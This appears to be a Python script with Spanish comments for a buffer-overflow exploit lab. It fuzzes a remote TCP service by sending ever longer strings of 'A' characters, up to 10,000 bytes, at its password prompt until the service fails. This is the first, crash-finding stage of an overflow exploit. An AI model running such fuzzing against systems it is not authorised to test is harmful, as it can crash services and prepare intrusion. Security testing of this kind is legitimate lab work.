#!/usr/bin/python3
import socket, sys, time
from parameters import rhost, rport, timeout
from colors import colors

buffer = []
cantidadFuzzing = 50
aumentoFuzzing = 200

# configuración de fuzzing
while len(buffer) < cantidadFuzzing:
    buffer.append(b'A' * aumentoFuzzing)
    aumentoFuzzing += 200

# fuzzing
for caracteres in buffer:
    try:        
        print(colors.Green + '\nRealizando fuzzing con %s bytes...' % len(caracteres) + colors.End)

        # conexión
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((rhost, rport))
        s.recv(1024)

        # password
        s.send(caracteres + b'\r\n')
        s.recv(1024)

        # cierre de conexión
        s.close()

    except Exception as error:
        print(colors.Red + '\n[!] Ha ocurrido un error:', str(error) + colors.End)
        sys.exit(0)
    time.sleep(2)